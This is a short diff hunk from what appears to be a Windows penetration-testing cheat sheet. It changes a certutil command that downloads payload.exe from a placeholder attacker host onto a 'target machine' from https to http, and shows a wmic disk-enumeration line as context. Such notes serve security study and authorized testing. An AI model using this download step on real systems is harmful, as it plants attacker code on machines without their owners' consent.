@@ -41,7 +41,7 @@ wmic logicaldisk get caption,description,providername`
 ```
 Download file in the target machine
 ```cmd
-certutil -urlcache -f https://[attackerIp]/payload.exe payload.exe
+certutil -urlcache -f http://[attackerIp]/payload.exe payload.exe
 ```
 File and directory permission
 ```cmd
